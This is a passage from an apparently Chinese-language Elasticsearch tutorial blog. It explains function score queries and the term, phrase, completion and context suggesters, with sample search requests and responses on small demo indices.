默认会以文档的相关度算分进行排序</li><li>可以通过制定一个或者多个字段进行排序</li><li>使用相关性算分（score）排序，不能满足某些特定条件<ul><li>无法针对相关度，对排序实现更多的控制</li></ul></li></ul><h3 id="Function-Score-Query"><a href="#Function-Score-Query" class="headerlink" title="Function Score Query"></a>Function Score Query</h3><ul><li>Function Score Query<ul><li>可以在查询结束后，对每一个匹配的文档进行一系列的重新算分，根据新生成的分数进行排序</li></ul></li><li>提供了几种默认的计算分值的函数<ul><li>Weight：为每一个文档设置一个简单而不被规范化的权重</li><li>Field Value Factor：使用该数值来修改_score，例如将 “热度” 和 “点赞数” 作为算分的参考因素</li><li>Random Score：为每一个用户使用一个不同的，随机算分结果</li><li>衰减函数∶ 以某个字段的值为标准，距离某个值越近，得分越高</li><li>Script Score∶ 自定义脚本完全控制所需逻辑</li></ul></li></ul><h3 id="按受欢迎度提升权重"><a href="#按受欢迎度提升权重" class="headerlink" title="按受欢迎度提升权重"></a>按受欢迎度提升权重</h3><ul><li>希望能够将点赞多的 blog，放在搜索列表相对靠前的位置。同事搜索的评分，还是要作为排序的主要依据</li><li>新的算分 = 老的算分 * 投票数<ul><li>投票数为 0</li><li>投票数很大时</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DELETE blogs</span><br><span class="line">PUT /blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:   <span class="string">"About popularity"</span>,</span><br><span class="line">  <span class="attr">"content"</span>: <span class="string">"In this post we will talk about..."</span>,</span><br><span class="line">  <span class="attr">"votes"</span>:   <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /blogs/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:   <span class="string">"About popularity"</span>,</span><br><span class="line">  <span class="attr">"content"</span>: <span class="string">"In this post we will talk about..."</span>,</span><br><span class="line">  <span class="attr">"votes"</span>:   <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /blogs/_doc/3</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:   <span class="string">"About popularity"</span>,</span><br><span class="line">  <span class="attr">"content"</span>: <span class="string">"In this post we will talk about..."</span>,</span><br><span class="line">  <span class="attr">"votes"</span>:   <span class="number">1000000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"function_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">          <span class="attr">"query"</span>:    <span class="string">"popularity"</span>,</span><br><span class="line">          <span class="attr">"fields"</span>: [ <span class="string">"title"</span>, <span class="string">"content"</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"field_value_factor"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"votes"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Modifier-平滑曲线"><a href="#使用-Modifier-平滑曲线" class="headerlink" title="使用 Modifier 平滑曲线"></a>使用 Modifier 平滑曲线</h3><ul><li>新的算分 = 老的算分 * log（1 + 投票数）</li></ul><p><img src="/images/big-data/es-05/17.jpg" alt="17"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"function_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">          <span class="attr">"query"</span>:    <span class="string">"popularity"</span>,</span><br><span class="line">          <span class="attr">"fields"</span>: [ <span class="string">"title"</span>, <span class="string">"content"</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"field_value_factor"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"votes"</span>,</span><br><span class="line">        <span class="attr">"modifier"</span>: <span class="string">"log1p"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引入-Factor"><a href="#引入-Factor" class="headerlink" title="引入 Factor"></a>引入 Factor</h3><ul><li>新的算分 = 老的算分 * log（1 + factor * 投票数）</li></ul><p><img src="/images/big-data/es-05/18.jpg" alt="18"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"function_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">          <span class="attr">"query"</span>:    <span class="string">"popularity"</span>,</span><br><span class="line">          <span class="attr">"fields"</span>: [ <span class="string">"title"</span>, <span class="string">"content"</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"field_value_factor"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"votes"</span>,</span><br><span class="line">        <span class="attr">"modifier"</span>: <span class="string">"log1p"</span> ,</span><br><span class="line">        <span class="attr">"factor"</span>: <span class="number">0.1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Boost-Mode-和-Max-Boost"><a href="#Boost-Mode-和-Max-Boost" class="headerlink" title="Boost Mode 和 Max Boost"></a>Boost Mode 和 Max Boost</h3><ul><li>Boost Mode<ul><li>Multiply：算分和函数值的乘积</li><li>Sum：算分和函数值的和</li><li>Min/Max：算分与函数去 最小 / 最大值</li><li>Replace：使用函数取代算分</li></ul></li><li>Max Boost 可以将算分控制在一个最大值</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"function_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">          <span class="attr">"query"</span>:    <span class="string">"popularity"</span>,</span><br><span class="line">          <span class="attr">"fields"</span>: [ <span class="string">"title"</span>, <span class="string">"content"</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"field_value_factor"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"votes"</span>,</span><br><span class="line">        <span class="attr">"modifier"</span>: <span class="string">"log1p"</span> ,</span><br><span class="line">        <span class="attr">"factor"</span>: <span class="number">0.1</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"boost_mode"</span>: <span class="string">"sum"</span>,</span><br><span class="line">      <span class="attr">"max_boost"</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一致性随机函数"><a href="#一致性随机函数" class="headerlink" title="一致性随机函数"></a>一致性随机函数</h3><ul><li>使用场景：网址的广告需要提高展示率</li><li>具体需求：让每个用户看到不同的随机排名，但是也希望同一个用户访问时，结果的相对顺序，保持一致（Consistently Random）</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"function_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"random_score"</span>: &#123;</span><br><span class="line">        <span class="attr">"seed"</span>: <span class="number">911119</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Term-amp-Phrase-Suggester"><a href="#Term-amp-Phrase-Suggester" class="headerlink" title="Term &amp; Phrase Suggester"></a>Term &amp; Phrase Suggester</h2><h3 id="什么是搜索建议"><a href="#什么是搜索建议" class="headerlink" title="什么是搜索建议"></a>什么是搜索建议</h3><ul><li>现代的搜索引擎，一般都会提供 Suggest as you type 的功能</li><li>帮助用户在输入搜索的过程中，进行自动补全或者纠错。通过协助用户输入更加精准的关键词，提高后续搜索阶段文档匹配的程度</li><li>在 google 上搜索，一开始会自动补全。当输入到一定长度，如因为单词拼写错误无法补全，就会开始提示相似的词或者句子</li></ul><h3 id="Elasticsearch-Suggester-API"><a href="#Elasticsearch-Suggester-API" class="headerlink" title="Elasticsearch Suggester API"></a>Elasticsearch Suggester API</h3><ul><li>搜索引擎中类似的功能，在 ES 中通过 Sugester API 实现的</li><li>原理：将输入的文档分解为 Token，然后在索引的字段里查找相似的 Term 并返回</li><li>根据不同的使用场景，ES 设计了 4 种类别的 Suggesters<ul><li>Term &amp; Phrase Suggester</li><li>Complete &amp; Context Suggester</li></ul></li></ul><h3 id="Term-Suggester"><a href="#Term-Suggester" class="headerlink" title="Term Suggester"></a>Term Suggester</h3><ul><li>Suggester 就是一种特殊类型的搜索。“text” 里是调用时候提供的文本，通常来自用户界面上用户输入的内容</li><li>用户输入的 “lucen” 是一个错误的拼写</li><li>会到 指定的字段 “body” 上搜索，当无法搜索到结果时（missing），返回建议的词</li></ul><h3 id="Term-Suggester-Missing-Mode"><a href="#Term-Suggester-Missing-Mode" class="headerlink" title="Term Suggester - Missing Mode"></a>Term Suggester - Missing Mode</h3><ul><li>搜索 “lucen rock”：<ul><li>每个建议都包含了一个算分，相似性是通过 Levenshtein Edit Distance 的算法实现的。核心思想就是一个词改动多少字段就可以和另外一个词一致。提供了很多可选参数来控制相似性的模糊程度。</li></ul></li><li>几种 Suggestion Mode<ul><li>Missing - 如索引中已存在，就不提供建议</li><li>Popular - 推荐出现频率更加高的词</li><li>Always - 无论是否存在，都提供建议</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line">POST article/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"body"</span>:<span class="string">"lucene is very cool"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"body"</span>:<span class="string">"Elasticsearch builds on top of lucene"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"body"</span>:<span class="string">"Elasticsearch rocks"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"body"</span>:<span class="string">"elastic is the company behind ELK stack"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"body"</span>:<span class="string">"Elk stack rocks"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"body"</span>:<span class="string">"elasticsearch is rock solid"</span>&#125;</span><br><span class="line"><span class="comment">//suggest</span></span><br><span class="line">POST article/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"body"</span>: <span class="string">"lucen rock"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"suggest"</span>: &#123;</span><br><span class="line">    <span class="attr">"term-suggestion"</span>: &#123;</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"lucen rock"</span>,</span><br><span class="line">      <span class="attr">"term"</span>: &#123;</span><br><span class="line">        <span class="attr">"suggest_mode"</span>: <span class="string">"missing"</span>, <span class="comment">// popular  always</span></span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"body"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回结果</span></span><br><span class="line">"suggest" : &#123;</span><br><span class="line">    "term-suggestion" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"text"</span> : <span class="string">"lucen"</span>,</span><br><span class="line">        <span class="attr">"offset"</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"length"</span> : <span class="number">5</span>,</span><br><span class="line">        <span class="attr">"options"</span> : [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span> : <span class="string">"lucene"</span>,<span class="comment">//推荐了</span></span><br><span class="line">            <span class="attr">"score"</span> : <span class="number">0.8</span>,</span><br><span class="line">            <span class="attr">"freq"</span> : <span class="number">2</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"text"</span> : <span class="string">"rock"</span>,<span class="comment">//没有推荐</span></span><br><span class="line">        <span class="attr">"offset"</span> : <span class="number">6</span>,</span><br><span class="line">        <span class="attr">"length"</span> : <span class="number">4</span>,</span><br><span class="line">        <span class="attr">"options"</span> : [ ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>默认使用 standard 分词器<ul><li>大写转小写</li><li>rocks 和 rock 是两个词</li></ul></li></ul><h3 id="Term-Suggester-Popuar-Mode"><a href="#Term-Suggester-Popuar-Mode" class="headerlink" title="Term Suggester - Popuar Mode"></a>Term Suggester - Popuar Mode</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">POST article/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"suggest"</span>: &#123;</span><br><span class="line">    <span class="attr">"term-suggestion"</span>: &#123;</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"lucen rock"</span>,</span><br><span class="line">      <span class="attr">"term"</span>: &#123;</span><br><span class="line">        <span class="attr">"suggest_mode"</span>: <span class="string">"popular"</span>,</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"body"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br><span class="line">"suggest" : &#123;</span><br><span class="line">    "term-suggestion" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"text"</span> : <span class="string">"lucen"</span>,</span><br><span class="line">        <span class="attr">"offset"</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"length"</span> : <span class="number">5</span>,</span><br><span class="line">        <span class="attr">"options"</span> : [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span> : <span class="string">"lucene"</span>,</span><br><span class="line">            <span class="attr">"score"</span> : <span class="number">0.8</span>,</span><br><span class="line">            <span class="attr">"freq"</span> : <span class="number">2</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"text"</span> : <span class="string">"rock"</span>,</span><br><span class="line">        <span class="attr">"offset"</span> : <span class="number">6</span>,</span><br><span class="line">        <span class="attr">"length"</span> : <span class="number">4</span>,</span><br><span class="line">        <span class="attr">"options"</span> : [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span> : <span class="string">"rocks"</span>,</span><br><span class="line">            <span class="attr">"score"</span> : <span class="number">0.75</span>,</span><br><span class="line">            <span class="attr">"freq"</span> : <span class="number">2</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="Sorting-by-Frequency-amp-PrefixLength"><a href="#Sorting-by-Frequency-amp-PrefixLength" class="headerlink" title="Sorting by Frequency &amp; PrefixLength"></a>Sorting by Frequency &amp; PrefixLength</h3><ul><li>默认按照 score 排序，也可以按照 “frequency”</li><li>默认首字母不一致就不会匹配推荐，但是如果将 prefix_length 设置为 0，就会为 hock 建议 rock</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /articles/_search</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="attr">"suggest"</span>: &#123;</span><br><span class="line">    <span class="attr">"term-suggestion"</span>: &#123;</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"lucen hocks"</span>,</span><br><span class="line">      <span class="attr">"term"</span>: &#123;</span><br><span class="line">        <span class="attr">"suggest_mode"</span>: <span class="string">"always"</span>,</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"body"</span>,</span><br><span class="line">        <span class="attr">"prefix_length"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">"sort"</span>: <span class="string">"frequency"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Phrase-Suggester"><a href="#Phrase-Suggester" class="headerlink" title="Phrase Suggester"></a>Phrase Suggester</h3><ul><li>Phrase Suggesetr 上增加了一些额外的逻辑<br>一些参数<ul><li>Suggeset Mode ： missing,popular ,always</li><li>Max Errors: 最多可以拼错的 Terms 数</li><li>Condfidence ： 限制返回结果数，默认为 1</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /articles/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"suggest"</span>: &#123;</span><br><span class="line">    <span class="attr">"my-suggestion"</span>: &#123;</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"lucne and elasticsear rock hello world "</span>,</span><br><span class="line">      <span class="attr">"phrase"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"body"</span>,</span><br><span class="line">        <span class="attr">"max_errors"</span>:<span class="number">2</span>,</span><br><span class="line">        <span class="attr">"confidence"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">"direct_generator"</span>:[&#123;</span><br><span class="line">          <span class="attr">"field"</span>:<span class="string">"body"</span>,</span><br><span class="line">          <span class="attr">"suggest_mode"</span>:<span class="string">"always"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="attr">"highlight"</span>: &#123;</span><br><span class="line">          <span class="attr">"pre_tag"</span>: <span class="string">"&lt;em&gt;"</span>,</span><br><span class="line">          <span class="attr">"post_tag"</span>: <span class="string">"&lt;/em&gt;"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自动补全与基于上下文的提示"><a href="#自动补全与基于上下文的提示" class="headerlink" title="自动补全与基于上下文的提示"></a>自动补全与基于上下文的提示</h2><h3 id="The-Completion-Suggester"><a href="#The-Completion-Suggester" class="headerlink" title="The Completion Suggester"></a>The Completion Suggester</h3><ul><li>Completion Suggester 提供了 “自动完成”（Auto Complete）的功能。用户每输入一个字符，就需要即时发送一个查询请求到后端查询匹配项</li><li>对性能要求比较苛刻。ES 采用了不同的数据结构，并非通过倒排索引来完成。而是将 Analyze 的数据编码成 FST 和索引一起存放。FST 会被 ES 整个加载进内存，速度很快</li><li>FST 只能用于前缀查找</li></ul><h3 id="使用-Completion-Suggester-一些步骤"><a href="#使用-Completion-Suggester-一些步骤" class="headerlink" title="使用 Completion Suggester 一些步骤"></a>使用 Completion Suggester 一些步骤</h3><ul><li>定义 Mapping，使用 “completion” type</li><li>索引数据</li><li>运行 “suggest” 查询，得到搜索建议</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义mapping</span></span><br><span class="line">PUT articles</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"title_completion"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"completion"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入数据</span></span><br><span class="line">POST articles/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title_completion"</span>:<span class="string">"lucene is very cool"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title_completion"</span>:<span class="string">"Elasticsearch builds on top of lucene"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title_completion"</span>:<span class="string">"Elasticsearch rocks"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title_completion"</span>:<span class="string">"elastic is the company behind ELK stack"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title_completion"</span>:<span class="string">"Elk stack rocks"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;&#125;&#125;</span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line">POST articles/_search?pretty</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"suggest"</span>: &#123;</span><br><span class="line">    <span class="attr">"article-suggest"</span>: &#123;</span><br><span class="line">      <span class="attr">"prefix"</span>: <span class="string">"e"</span>, <span class="comment">//查询字段 </span></span><br><span class="line">      <span class="attr">"completion"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"title_completion"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="什么是-Context-Suggester"><a href="#什么是-Context-Suggester" class="headerlink" title="什么是 Context Suggester"></a>什么是 Context Suggester</h3><ul><li>Completion Suggester 的扩展</li><li>可以在搜索中加入耕读偶读上下文信息，例如，输入 “star”<ul><li>咖啡相关：starbucks</li><li>电影相关：star wars</li></ul></li></ul><h3 id="实现-Context-Suggester"><a href="#实现-Context-Suggester" class="headerlink" title="实现 Context Suggester"></a>实现 Context Suggester</h3><ul><li>可以定义两种类型的 Context<ul><li>Category - 任意的字符串</li><li>Geo - 地理信息位置</li></ul></li><li>实现 Context Suggester<ul><li>定制一个 Mapping</li><li>索引数据，并且为每个文档加入 Conetxt 信息</li><li>结合 Context 进行 Suggestion 查询</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 